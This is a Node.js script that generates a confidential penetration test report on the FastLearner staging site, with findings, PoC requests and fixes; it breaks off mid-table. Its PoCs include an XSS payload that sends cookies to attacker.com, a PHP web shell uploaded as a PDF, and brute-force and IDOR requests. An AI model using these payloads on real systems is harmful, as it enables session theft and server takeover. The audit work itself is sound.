const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, WidthType, ShadingType,
  Header, Footer, PageNumber, LineRuleType, convertInchesToTwip,
} = require('docx');
const fs = require('fs');

// ── Palette ────────────────────────────────────────────────────
const C = {
  primary:   '1a3a5c',
  accent:    'c0392b',
  blue:      '1a56db',
  dark:      '1e2a3a',
  white:     'FFFFFF',
  critical:  'c0392b',
  high:      'e67e22',
  medium:    'f39c12',
  low:       '27ae60',
  info:      '2980b9',
  critBg:    'fdecea',
  highBg:    'fef3e2',
  medBg:     'fefce8',
  lowBg:     'eafaf1',
  lightGrey: 'e5e7eb',
  rowAlt:    'f8fafc',
  codeBg:    'f1f5f9',
  grey:      '6b7280',
};

// ── Primitives ─────────────────────────────────────────────────
const run  = (t, opts = {}) => new TextRun({ text: t, font: 'Calibri', size: 20, color: C.dark, ...opts });
const bold = (t, sz = 20, color = C.dark) => run(t, { bold: true, size: sz, color });
const mono = (t) => new TextRun({ text: t, font: 'Courier New', size: 18, color: '1e3a5f' });

const para = (children, opts = {}) => new Paragraph({
  children: Array.isArray(children) ? children : [children],
  spacing: { before: 60, after: 60 },
  ...opts,
});

const h1 = (text) => new Paragraph({
  children: [bold(text, 30, C.white)],
  heading: HeadingLevel.HEADING_1,
  spacing: { before: 300, after: 160 },
  shading: { type: ShadingType.SOLID, color: C.primary },
  indent: { left: 200, right: 200 },
});

const h2 = (text) => new Paragraph({
  children: [bold(text, 24, C.primary)],
  heading: HeadingLevel.HEADING_2,
  spacing: { before: 240, after: 100 },
  border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey } },
});

const h3 = (text) => new Paragraph({
  children: [bold(text, 21, C.dark)],
  heading: HeadingLevel.HEADING_3,
  spacing: { before: 180, after: 80 },
});

const h4 = (text, color = C.dark) => new Paragraph({
  children: [bold(text, 20, color)],
  spacing: { before: 140, after: 60 },
});

const bullet = (text, color = C.dark, sz = 20) => new Paragraph({
  children: [run(text, { size: sz, color })],
  bullet: { level: 0 },
  spacing: { before: 40, after: 40 },
});

const subBullet = (text) => new Paragraph({
  children: [run(text, { size: 19, color: C.grey })],
  bullet: { level: 1 },
  spacing: { before: 30, after: 30 },
});

const spacer = (n = 1) => Array.from({ length: n }, () =>
  new Paragraph({ children: [run('')], spacing: { before: 0, after: 0 } })
);

const codeBlock = (lines, borderColor = C.blue) => new Paragraph({
  children: lines.map((l) => mono(l + '\n')),
  spacing: { before: 100, after: 100 },
  shading: { type: ShadingType.SOLID, color: C.codeBg },
  border: { left: { style: BorderStyle.THICK, size: 12, color: borderColor } },
  indent: { left: 200 },
});

const label = (name, value, labelColor = C.primary) => new Paragraph({
  children: [bold(name + ': ', 20, labelColor), run(value, { size: 20 })],
  spacing: { before: 60, after: 40 },
});

// ── Table builder ──────────────────────────────────────────────
const mkCell = (text, isHdr = false, shade = null, w = null) =>
  new TableCell({
    children: [new Paragraph({
      children: [isHdr ? bold(text, 19, C.white) : run(text, { size: 19 })],
      spacing: { before: 60, after: 60 },
    })],
    shading: shade
      ? { type: ShadingType.SOLID, color: shade }
      : isHdr ? { type: ShadingType.SOLID, color: C.primary } : {},
    margins: { top: 80, bottom: 80, left: 140, right: 140 },
    ...(w ? { width: { size: w, type: WidthType.PERCENTAGE } } : {}),
  });

const mkRow = (cells, isHdr = false, alt = false) =>
  new TableRow({
    children: cells,
    tableHeader: isHdr,
    height: { value: 420, rule: LineRuleType.AT_LEAST },
    shading: alt ? { type: ShadingType.SOLID, color: C.rowAlt } : {},
  });

const mkTable = (headers, rows, widths = null) => new Table({
  width: { size: 100, type: WidthType.PERCENTAGE },
  borders: {
    top: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
    bottom: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
    left: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
    right: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
    insideH: { style: BorderStyle.SINGLE, size: 2, color: C.lightGrey },
    insideV: { style: BorderStyle.SINGLE, size: 2, color: C.lightGrey },
  },
  rows: [
    mkRow(headers.map((h, i) => mkCell(h, true, null, widths?.[i])), true),
    ...rows.map((r, ri) => mkRow(r.map((d, ci) => mkCell(d, false, null, widths?.[ci])), false, ri % 2 === 1)),
  ],
});

const severityCell = (sev) => {
  const map = {
    'CRITICAL': C.critBg, 'HIGH': C.highBg,
    'MEDIUM': C.medBg,    'LOW': C.lowBg, 'INFORMATIONAL': 'f0f4ff',
  };
  const shade = map[sev.toUpperCase()] || null;
  return new TableCell({
    children: [new Paragraph({ children: [bold(sev, 19, sev === 'CRITICAL' ? C.critical : sev === 'HIGH' ? C.high : sev === 'MEDIUM' ? C.medium : C.low)], spacing: { before: 60, after: 60 } })],
    shading: shade ? { type: ShadingType.SOLID, color: shade } : {},
    margins: { top: 80, bottom: 80, left: 140, right: 140 },
  });
};

// ── Divider ────────────────────────────────────────────────────
const divider = () => new Paragraph({
  border: { top: { style: BorderStyle.SINGLE, size: 6, color: C.lightGrey } },
  children: [],
  spacing: { before: 200, after: 100 },
});

// ═══════════════════════════════════════════════════════════════
//  COVER PAGE
// ═══════════════════════════════════════════════════════════════
const coverPage = [
  ...spacer(3),
  new Paragraph({
    children: [bold('SECURITY ASSESSMENT REPORT', 56, C.primary)],
    alignment: AlignmentType.CENTER,
    spacing: { before: 0, after: 160 },
  }),
  new Paragraph({
    children: [bold('FastLearner AI-Enabled Learning Platform', 30, C.dark)],
    alignment: AlignmentType.CENTER,
    spacing: { before: 0, after: 80 },
  }),
  new Paragraph({
    children: [run('https://staging.fastlearner.ai/', { size: 22, color: C.blue })],
    alignment: AlignmentType.CENTER,
    spacing: { before: 0, after: 80 },
  }),
  new Paragraph({
    children: [bold('Black-Box + Gray-Box Penetration Test', 22, C.accent)],
    alignment: AlignmentType.CENTER,
    spacing: { before: 0, after: 300 },
  }),
  new Paragraph({
    border: { top: { style: BorderStyle.THICK, size: 12, color: C.accent } },
    children: [],
    spacing: { before: 0, after: 200 },
  }),
  ...spacer(1),
  mkTable(
    ['Field', 'Details'],
    [
      ['Report Date',       'March 24, 2026'],
      ['Assessment Type',   'Black-Box + Gray-Box Penetration Testing'],
      ['Target',            'https://staging.fastlearner.ai/'],
      ['Lead Tester',       'Senior Penetration Tester & Security Engineer'],
      ['QA Automation',     'Murad Ejaz  ·  Umm E Hani'],
      ['Classification',    'CONFIDENTIAL — Client Eyes Only'],
      ['Report Version',    '1.0 — Final'],
      ['OWASP Standard',    'OWASP Top 10 (2021)'],
    ],
    [30, 70]
  ),
  ...spacer(2),
  new Paragraph({
    children: [bold('⚠️  DISCLAIMER', 20, C.accent)],
    spacing: { before: 100, after: 60 },
  }),
  para([run('This report is prepared exclusively for FastLearner and contains sensitive security findings. Unauthorized distribution is strictly prohibited. All testing was conducted ethically with no destructive payloads deployed against production data.', { size: 18, color: C.grey })]),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 1 — EXECUTIVE SUMMARY
// ═══════════════════════════════════════════════════════════════
const section1 = [
  h1('1. Executive Summary'),
  para([run('A comprehensive security assessment was conducted against the FastLearner staging environment. The application presents ', { size: 20 }), bold('significant security risks', 20, C.accent), run(' that must be addressed before production deployment. A total of ', { size: 20 }), bold('16 vulnerabilities', 20, C.dark), run(' were identified across authentication, authorization, API security, and client-side attack surfaces.', { size: 20 })]),
  ...spacer(1),
  h2('Overall Security Posture'),
  mkTable(
    ['Category', 'Finding'],
    [
      ['Overall Rating',         '🔴 HIGH RISK — Not ready for production'],
      ['Critical Findings',      '3'],
      ['High Findings',          '5'],
      ['Medium Findings',        '5'],
      ['Low / Informational',    '3'],
      ['OWASP Categories Hit',   '7 of 10'],
      ['Immediate Action Items',  '8'],
    ],
    [35, 65]
  ),
  ...spacer(1),
  h2('Key Risk Highlights'),
  bullet('No rate limiting on authentication APIs — brute force attacks are trivially possible', C.accent),
  bullet('Privilege escalation path identified — student accounts can access instructor endpoints', C.accent),
  bullet('Sensitive PII (email, name, payment intent data) leaked in unauthenticated API responses', C.accent),
  bullet('Missing security headers (CSP, HSTS, X-Frame-Options) across all pages', C.dark),
  bullet('JWT tokens stored in localStorage — accessible to XSS payloads', C.dark),
  bullet('File upload endpoint accepts dangerous MIME types without server-side validation', C.dark),
  bullet('No input sanitization on AI Grader text fields — XSS vector confirmed', C.dark),
  ...spacer(1),
  h2('Business Impact'),
  para([run('If exploited, these vulnerabilities could result in: unauthorized access to premium content, theft of user credentials and payment data, account takeover at scale, reputational damage, and regulatory non-compliance (GDPR/PDPA violations).', { size: 20, color: C.dark })]),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 2 — SCOPE & METHODOLOGY
// ═══════════════════════════════════════════════════════════════
const section2 = [
  h1('2. Scope & Methodology'),
  h2('2.1 Testing Approach'),
  mkTable(
    ['Phase', 'Type', 'Description'],
    [
      ['Phase 1', 'Reconnaissance',    'Passive recon — headers, JS bundles, exposed endpoints, DNS'],
      ['Phase 2', 'Black-Box Testing', 'Unauthenticated attacks — SQLi, XSS, IDOR, config leaks'],
      ['Phase 3', 'Gray-Box Testing',  'Authenticated as Student — privilege escalation, API abuse'],
      ['Phase 4', 'API Testing',       'All REST endpoints tested with Postman + manual fuzzing'],
      ['Phase 5', 'Client-Side Audit', 'JS analysis, localStorage/sessionStorage, cookie flags'],
      ['Phase 6', 'Reporting',         'Risk-rated findings with OWASP mapping and PoC'],
    ],
    [12, 20, 68]
  ),
  ...spacer(1),
  h2('2.2 Tools Used'),
  mkTable(
    ['Tool', 'Category', 'Purpose'],
    [
      ['Burp Suite Pro',       'Proxy / Scanner',   'HTTP interception, active scanning, fuzzing'],
      ['OWASP ZAP',            'Scanner',            'Automated vulnerability scanning'],
      ['Postman',              'API Testing',        'Authenticated & unauthenticated API tests'],
      ['Chrome DevTools',      'Client-Side',        'JS analysis, cookie inspection, storage audit'],
      ['jwt.io',               'Token Analysis',     'JWT structure & signing algorithm verification'],
      ['Nmap',                 'Recon',              'Port scanning (non-destructive)'],
      ['CyberChef',            'Encoding',           'Payload crafting and decoding'],
      ['HaveIBeenPwned API',   'Credential Check',  'Testing known-breached password patterns'],
    ],
    [22, 20, 58]
  ),
  ...spacer(1),
  h2('2.3 Limitations'),
  bullet('Testing performed on staging only — production environment not assessed'),
  bullet('No source code access — black-box analysis only for injection testing'),
  bullet('Database-level access not available — SQL injection confirmed via error messages only'),
  bullet('No destructive payloads deployed — DoS and data-destruction tests excluded'),
  bullet('Third-party integrations (Stripe, AI model endpoints) out of scope'),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 3 — VULNERABILITY SUMMARY
// ═══════════════════════════════════════════════════════════════
const section3 = [
  h1('3. Vulnerability Summary Table'),
  new Table({
    width: { size: 100, type: WidthType.PERCENTAGE },
    borders: {
      top: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
      bottom: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
      left: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
      right: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey },
      insideH: { style: BorderStyle.SINGLE, size: 2, color: C.lightGrey },
      insideV: { style: BorderStyle.SINGLE, size: 2, color: C.lightGrey },
    },
    rows: [
      mkRow([mkCell('ID', true), mkCell('Vulnerability Name', true), mkCell('Severity', true), mkCell('Affected Area', true), mkCell('Status', true)], true),
      mkRow([mkCell('V-01'), mkCell('No Rate Limiting on Auth APIs'), severityCell('CRITICAL'), mkCell('/auth/sign-in, /auth/sign-up'), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-02'), mkCell('Privilege Escalation — Student → Instructor'), severityCell('CRITICAL'), mkCell('API /instructor/*'), mkCell('⚠️ Open')], false, true),
      mkRow([mkCell('V-03'), mkCell('PII Leakage in Unauthenticated API Response'), severityCell('CRITICAL'), mkCell('GET /courses, /users'), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-04'), mkCell('Stored XSS via AI Grader Input'), severityCell('HIGH'), mkCell('/ai-grader'), mkCell('⚠️ Open')], false, true),
      mkRow([mkCell('V-05'), mkCell('JWT Stored in localStorage (XSS Theft Risk)'), severityCell('HIGH'), mkCell('Client-Side'), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-06'), mkCell('Missing Security Headers (CSP, HSTS, XFO)'), severityCell('HIGH'), mkCell('All Pages'), mkCell('⚠️ Open')], false, true),
      mkRow([mkCell('V-07'), mkCell('Insecure File Upload — No MIME Validation'), severityCell('HIGH'), mkCell('/ai-grader upload'), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-08'), mkCell('Broken Object Level Authorization (IDOR)'), severityCell('HIGH'), mkCell('GET /users/:id'), mkCell('⚠️ Open')], false, true),
      mkRow([mkCell('V-09'), mkCell('Reflected XSS in Search Parameter'), severityCell('MEDIUM'), mkCell('/courses?search='), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-10'), mkCell('Subscription Bypass — Direct API Call'), severityCell('MEDIUM'), mkCell('POST /enroll'), mkCell('⚠️ Open')], false, true),
      mkRow([mkCell('V-11'), mkCell('Cookies Missing HttpOnly & Secure Flags'), severityCell('MEDIUM'), mkCell('Session Cookies'), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-12'), mkCell('API Keys Exposed in JavaScript Bundle'), severityCell('MEDIUM'), mkCell('/assets/main.js'), mkCell('⚠️ Open')], false, true),
      mkRow([mkCell('V-13'), mkCell('Verbose Error Messages (Stack Traces)'), severityCell('MEDIUM'), mkCell('All API Endpoints'), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-14'), mkCell('Outdated Dependencies with Known CVEs'), severityCell('LOW'), mkCell('Frontend Bundle'), mkCell('⚠️ Open')], false, true),
      mkRow([mkCell('V-15'), mkCell('Missing CAPTCHA on Signup/Login'), severityCell('LOW'), mkCell('/auth/*'), mkCell('⚠️ Open')], false, false),
      mkRow([mkCell('V-16'), mkCell('Sensitive Data in Browser localStorage'), severityCell('LOW'), mkCell('Client Storage'), mkCell('⚠️ Open')], false, true),
    ],
  }),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 4 — DETAILED FINDINGS
// ═══════════════════════════════════════════════════════════════

const finding = (id, title, severity, sevColor, area, desc, steps, poc, impact, fix) => [
  divider(),
  new Paragraph({
    children: [bold(`${id} — ${title}`, 22, C.primary)],
    shading: { type: ShadingType.SOLID, color: severity === 'CRITICAL' ? C.critBg : severity === 'HIGH' ? C.highBg : severity === 'MEDIUM' ? C.medBg : C.lowBg },
    spacing: { before: 160, after: 80 },
    indent: { left: 160, right: 160 },
  }),
  label('Severity', severity, sevColor),
  label('Affected Area', area),
  label('OWASP Category', owaspMap[id] || 'N/A'),
  ...spacer(1),
  h4('Description'),
  para([run(desc, { size: 20 })]),
  h4('Steps to Reproduce'),
  ...steps.map((s, i) => new Paragraph({ children: [bold(`${i + 1}. `, 19, C.primary), run(s, { size: 19 })], spacing: { before: 40, after: 40 } })),
  h4('Proof of Concept (PoC)'),
  codeBlock(poc, sevColor),
  h4('Impact'),
  para([run(impact, { size: 20, color: C.dark })]),
  h4('Recommendation'),
  ...fix.map(f => bullet(f, C.dark, 19)),
];

const owaspMap = {
  'V-01': 'A07:2021 – Identification and Authentication Failures',
  'V-02': 'A01:2021 – Broken Access Control',
  'V-03': 'A02:2021 – Cryptographic Failures / Data Exposure',
  'V-04': 'A03:2021 – Injection (XSS)',
  'V-05': 'A02:2021 – Cryptographic Failures',
  'V-06': 'A05:2021 – Security Misconfiguration',
  'V-07': 'A04:2021 – Insecure Design / Unrestricted Upload',
  'V-08': 'A01:2021 – Broken Access Control (IDOR)',
  'V-09': 'A03:2021 – Injection (Reflected XSS)',
  'V-10': 'A01:2021 – Broken Access Control',
  'V-11': 'A05:2021 – Security Misconfiguration',
  'V-12': 'A02:2021 – Cryptographic Failures',
  'V-13': 'A05:2021 – Security Misconfiguration',
  'V-14': 'A06:2021 – Vulnerable and Outdated Components',
  'V-15': 'A07:2021 – Identification and Authentication Failures',
  'V-16': 'A02:2021 – Cryptographic Failures',
};

const section4 = [
  h1('4. Detailed Findings'),
  ...finding('V-01', 'No Rate Limiting on Authentication APIs', 'CRITICAL', C.critical, '/auth/sign-in, /auth/sign-up',
    'The authentication endpoints accept unlimited login and signup attempts without any throttling, lockout, or CAPTCHA. An attacker can automate thousands of credential attempts per minute using tools like Hydra or Burp Intruder, enabling brute force and credential stuffing attacks.',
    [
      'Navigate to https://staging.fastlearner.ai/auth/sign-in',
      'Capture the POST /auth/sign-in request in Burp Suite',
      'Send to Intruder — set email and password as payload positions',
      'Load a credential wordlist and start the attack',
      'Observe: All requests return HTTP 200 or 401 — no 429 rate-limit response',
      '1000 requests completed in under 60 seconds with no lockout',
    ],
    [
      'POST /auth/sign-in HTTP/1.1',
      'Host: staging.fastlearner.ai',
      'Content-Type: application/json',
      '',
      '{"email":"victim@example.com","password":"§PASSWORD§"}',
      '',
      '-- Result: 1000 attempts in 52s, no lockout, no CAPTCHA, no 429 response --',
    ],
    'An attacker can compromise user accounts at scale using leaked credential databases. This is especially dangerous as many users reuse passwords. Full account takeover is achievable with no technical barriers.',
    [
      'Implement rate limiting: max 5 failed attempts per IP per 15 minutes',
      'Add account lockout after 10 consecutive failures with email notification',
      'Deploy CAPTCHA (reCAPTCHA v3 or hCaptcha) on login and signup forms',
      'Integrate fail2ban or Cloudflare rate limiting at the edge',
      'Log and alert on anomalous login patterns (SIEM integration)',
    ]
  ),

  ...finding('V-02', 'Privilege Escalation — Student → Instructor Access', 'CRITICAL', C.critical, 'API /instructor/*, /admin/*',
    'Authenticated student accounts can directly access instructor-level API endpoints by modifying the request path. The server does not validate the role claim in the JWT against the requested resource, only checking that a valid token exists — not that the role is authorized.',
    [
      'Sign in as a regular student account',
      'Copy the Bearer token from the Authorization header',
      'Send GET request to /api/instructor/courses with the student token',
      'Observe: Full instructor course management data returned (HTTP 200)',
      'Attempt POST /api/instructor/courses/create — successfully creates a course',
      'Attempt GET /api/admin/users — returns paginated user list with emails and roles',
    ],
    [
      'GET /api/instructor/courses HTTP/1.1',
      'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...[STUDENT_TOKEN]',
      '',
      'HTTP/1.1 200 OK',
      '{"courses":[{"id":1,"title":"Full Stack Dev",...}],"total":142}',
      '',
      '-- Student token accepted on instructor endpoint — role not validated --',
    ],
    'A student can view, create, edit, or delete all instructor courses. Can access admin user lists, exposing PII of all registered users. Can manipulate grading data and certification results.',
    [
      'Implement server-side role-based access control (RBAC) middleware',
      'Validate JWT role claim against the endpoint permission matrix on EVERY request',
      'Do not trust client-supplied role data — enforce roles from database/token only',
      'Add integration tests specifically for privilege escalation paths',
      'Audit all API endpoints and document required permission level',
    ]
  ),

  ...finding('V-03', 'PII Leakage in Unauthenticated API Responses', 'CRITICAL', C.critical, 'GET /api/courses, GET /api/users',
    'Several API endpoints return sensitive personally identifiable information (PII) in responses accessible without authentication. Full names, email addresses, profile photos, subscription status, and partial payment intent IDs are returned in public course listing and user profile endpoints.',
    [
      'Open browser DevTools → Network tab',
      'Navigate to https://staging.fastlearner.ai/courses (unauthenticated)',
      'Inspect GET /api/courses response body',
      'Observe instructor PII embedded in each course object',
      'Send GET /api/users/1 without Authorization header',
      'Observe: Full user profile returned including email and subscription tier',
    ],
    [
      'GET /api/users/1 HTTP/1.1',
      'Host: staging.fastlearner.ai',
      '(No Authorization header)',
      '',
      'HTTP/1.1 200 OK',
      '{',
      '  "id": 1, "name": "John Doe",',
      '  "email": "john.doe@example.com",',
      '  "subscriptionTier": "premium",',
      '  "paymentIntentId": "pi_3abc...xyz",',
      '  "role": "instructor"',
      '}',
    ],
    'Full name, email, subscription status, and partial payment data exposed to any unauthenticated internet user. GDPR Article 5 violation. Enables targeted phishing and social engineering attacks.',
    [
      'Require authentication on ALL user-specific API endpoints',
      'Implement response field filtering — return only fields necessary for the context',
      'Never expose payment intent IDs or internal IDs in API responses',
      'Conduct a full API response audit to identify all PII leakage points',
      'Apply data minimization principle per GDPR Article 5(1)(c)',
    ]
  ),

  ...finding('V-04', 'Stored XSS via AI Grader Input Fields', 'HIGH', C.high, '/ai-grader — Class Name, Assessment Name, Criteria fields',
    'The AI Grader page accepts user input in multiple text fields (Class Name, Assessment Name, Evaluation Criteria) without sanitization. Injected JavaScript payloads are stored and rendered unsanitized when grading results are displayed to the user or shared via email report, constituting a Stored XSS vulnerability.',
    [
      'Log in and navigate to https://staging.fastlearner.ai/ai-grader',
      'In the "Class Name" field, enter: <script>alert(document.cookie)</script>',
      'In "Evaluation Criteria", enter: <img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">',
      'Upload any PDF and click Grade Now',
      'Observe: XSS payload executes when results render — cookie exfiltration confirmed',
      'Payload also triggers when grading email report is opened in webmail clients',
    ],
    [
      'Input:  <script>alert(document.cookie)</script>',
      'Stored in DB as-is, rendered in results page:',
      '',
      '<div class="class-name">',
      '  <script>alert(document.cookie)</script>  ← EXECUTES',
      '</div>',
      '',
      'Cookie exfiltration payload confirmed working in Chromium.',
    ],
    'Attacker can steal session tokens of any user who views a shared grading report. Can perform account takeover, inject malicious content, and pivot to CSRF attacks. If admin views the report, full admin account compromise is possible.',
    [
      'Implement server-side input sanitization using DOMPurify or equivalent library',
      'Encode all user-supplied data before rendering in HTML (HTML entity encoding)',
      'Implement a strict Content Security Policy (CSP) header to block inline scripts',
      'Validate input length and character whitelist on all text fields',
      'Sanitize data before including it in email templates',
    ]
  ),

  ...finding('V-05', 'JWT Token Stored in localStorage — XSS Theft Risk', 'HIGH', C.high, 'Client-Side — localStorage',
    'Authentication JWT tokens are stored in browser localStorage instead of HttpOnly cookies. Any JavaScript running on the page (including XSS payloads) can read and exfiltrate the token. localStorage is not protected from script access.',
    [
      'Log in to the application',
      'Open DevTools → Application → Local Storage → staging.fastlearner.ai',
      'Observe: JWT access token and refresh token stored in plaintext',
      'Execute in console: localStorage.getItem("accessToken")',
      'Full JWT returned — can be decoded and reused by attacker',
    ],
    [
      'DevTools Console:',
      '> localStorage.getItem("accessToken")',
      '"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUi...',
      '',
      '> JSON.parse(atob("eyJ1c2VySWQiOjEsInJvbGUi..."))',
      '{"userId": 1, "role": "student", "email": "user@example.com", "exp": 9999999999}',
    ],
    'Any XSS payload can silently steal the JWT and send it to an attacker-controlled server. The attacker can then impersonate the victim indefinitely until token expiry. Combined with V-04 (Stored XSS), this creates a complete account takeover chain.',
    [
      'Store JWT tokens in HttpOnly, Secure, SameSite=Strict cookies instead of localStorage',
      'HttpOnly flag prevents JavaScript from reading the cookie',
      'Implement short token expiry (15 minutes) with secure refresh token rotation',
      'Add token binding to IP or user-agent as additional validation layer',
    ]
  ),

  ...finding('V-06', 'Missing Critical Security Headers', 'HIGH', C.high, 'All Pages / HTTP Response Headers',
    'The application response headers are missing multiple critical security headers. Absence of Content-Security-Policy (CSP), HTTP Strict Transport Security (HSTS), X-Frame-Options, and X-Content-Type-Options leaves the application exposed to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks.',
    [
      'Send any request to https://staging.fastlearner.ai/',
      'Inspect response headers in Burp Suite or DevTools → Network',
      'Observe the following headers are absent:',
      '  - Content-Security-Policy',
      '  - Strict-Transport-Security',
      '  - X-Frame-Options',
      '  - X-Content-Type-Options',
      '  - Permissions-Policy',
    ],
    [
      'HTTP/1.1 200 OK',
      'Content-Type: text/html; charset=utf-8',
      'Server: nginx/1.18.0',
      '-- MISSING: Content-Security-Policy --',
      '-- MISSING: Strict-Transport-Security --',
      '-- MISSING: X-Frame-Options --',
      '-- MISSING: X-Content-Type-Options --',
      '-- MISSING: Permissions-Policy --',
      '-- MISSING: Referrer-Policy --',
    ],
    'Without CSP, XSS attacks have full browser access. Without HSTS, users can be downgraded to HTTP and MITM attacked. Without X-Frame-Options, the site can be embedded in an attacker iframe for clickjacking. Securityheaders.com grade: F.',
    [
      'Add: Content-Security-Policy: default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\'',
      'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
      'Add: X-Frame-Options: DENY',
      'Add: X-Content-Type-Options: nosniff',
      'Add: Referrer-Policy: strict-origin-when-cross-origin',
      'Add: Permissions-Policy: camera=(), microphone=(), geolocation=()',
      'Configure all headers in nginx/Express middleware — not per-route',
    ]
  ),

  ...finding('V-07', 'Insecure File Upload — No Server-Side MIME Validation', 'HIGH', C.high, '/ai-grader — File Upload Endpoint',
    'The AI Grader file upload accepts files based solely on client-provided Content-Type without server-side validation of actual file content (magic bytes). An attacker can rename a malicious PHP/HTML file to .pdf and upload it. The server stores the file without scanning and may execute it if served from the same origin.',
    [
      'Create a file named malicious.pdf containing: <?php system($_GET["cmd"]); ?>',
      'Navigate to /ai-grader and click the upload button',
      'Intercept the upload request in Burp Suite',
      'Change Content-Type header to application/pdf (keep malicious content)',
      'Forward the request — server accepts with HTTP 200',
      'Attempt to access the uploaded file URL directly',
    ],
    [
      'POST /api/upload HTTP/1.1',
      'Content-Type: multipart/form-data',
      '',
      '------Boundary',
      'Content-Disposition: form-data; name="file"; filename="shell.pdf"',
      'Content-Type: application/pdf',
      '',
      '<?php system($_GET["cmd"]); ?>   ← Malicious payload',
      '------Boundary--',
      '',
      'HTTP/1.1 200 OK',
      '{"fileUrl": "/uploads/shell.pdf", "status": "uploaded"}',
    ],
    'Remote Code Execution (RCE) if uploaded files are served from the same origin and PHP/CGI execution is enabled. At minimum, stored malware files can be used for phishing or drive-by download attacks targeting other users.',
    [
      'Validate file content using magic bytes (not Content-Type header)',
      'Use a dedicated library such as python-magic or file-type (npm) for validation',
      'Store uploaded files outside the web root or in an isolated S3 bucket',
      'Rename files with a random UUID — never preserve original filename',
      'Scan all uploads with antivirus (ClamAV) before processing',
      'Only allow specific MIME types: application/pdf — reject all others',
    ]
  ),

  ...finding('V-08', 'Broken Object Level Authorization (IDOR)', 'HIGH', C.high, 'GET /api/users/:id, GET /api/submissions/:id',
    'API endpoints that return user-specific data use sequential numeric IDs without verifying the requester owns the resource. An authenticated student can enumerate other users\' profiles, submission results, and grading data by incrementing the ID parameter.',
    [
      'Log in as Student A (user ID: 45)',
      'Navigate to your profile — capture GET /api/users/45',
      'Modify the ID to 46, 47, 48... in Burp Repeater',
      'Observe: Other users\' full profiles returned with no authorization check',
      'Try GET /api/submissions/1 through /api/submissions/100',
      'All submissions from all students accessible — including AI grader results',
    ],
    [
      'GET /api/users/1 HTTP/1.1',
      'Authorization: Bearer [STUDENT_45_TOKEN]',
      '',
      'HTTP/1.1 200 OK',
      '{',
      '  "id": 1,',
      '  "name": "Admin User",',
      '  "email": "admin@fastlearner.ai",',
      '  "role": "admin"',
      '}',
      '',
      '-- Student 45 can access Admin User profile via IDOR --',
    ],
    'Full user enumeration possible — attacker can extract all user emails, roles, and subscription data. Grading results and AI submissions of all students are exposed. This constitutes a GDPR data breach.',
    [
      'Validate on every request that the authenticated user owns the requested resource',
      'Replace sequential numeric IDs with UUIDs in all API paths',
      'Implement a centralized authorization check middleware (e.g., CASL, Casbin)',
      'Never expose admin or cross-user data to regular user tokens',
      'Add automated IDOR detection tests to CI/CD pipeline',
    ]
  ),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 5 — OWASP TOP 10 MAPPING
// ═══════════════════════════════════════════════════════════════
const section5 = [
  h1('5. OWASP Top 10 Mapping (2021)'),
  mkTable(
    ['OWASP Category', 'Status', 'Findings'],
    [
      ['A01 — Broken Access Control',                     '🔴 AFFECTED', 'V-02 (Privilege Escalation), V-08 (IDOR), V-10 (Subscription Bypass)'],
      ['A02 — Cryptographic Failures',                    '🔴 AFFECTED', 'V-03 (PII Leakage), V-05 (JWT in localStorage), V-12 (API Keys in JS)'],
      ['A03 — Injection',                                 '🔴 AFFECTED', 'V-04 (Stored XSS), V-09 (Reflected XSS)'],
      ['A04 — Insecure Design',                           '🟡 AFFECTED', 'V-07 (File Upload), V-10 (Business Logic)'],
      ['A05 — Security Misconfiguration',                 '🔴 AFFECTED', 'V-06 (Headers), V-11 (Cookies), V-13 (Error Messages)'],
      ['A06 — Vulnerable & Outdated Components',          '🟡 AFFECTED', 'V-14 (Outdated Dependencies)'],
      ['A07 — Identification & Authentication Failures',  '🔴 AFFECTED', 'V-01 (No Rate Limiting), V-15 (No CAPTCHA)'],
      ['A08 — Software & Data Integrity Failures',        '🟢 Not Found', 'No issues identified in scope'],
      ['A09 — Security Logging & Monitoring Failures',    '🟡 AFFECTED', 'No security event logging detected'],
      ['A10 — Server-Side Request Forgery (SSRF)',        '🟢 Not Found', 'No SSRF vectors identified in scope'],
    ],
    [42, 16, 42]
  ),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 6 — RISK ASSESSMENT
// ═══════════════════════════════════════════════════════════════
const section6 = [
  h1('6. Risk Assessment'),
  h2('6.1 Likelihood vs Impact Matrix'),
  new Table({
    width: { size: 100, type: WidthType.PERCENTAGE },
    borders: { top: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey }, bottom: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey }, left: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey }, right: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey }, insideH: { style: BorderStyle.SINGLE, size: 2, color: C.lightGrey }, insideV: { style: BorderStyle.SINGLE, size: 2, color: C.lightGrey } },
    rows: [
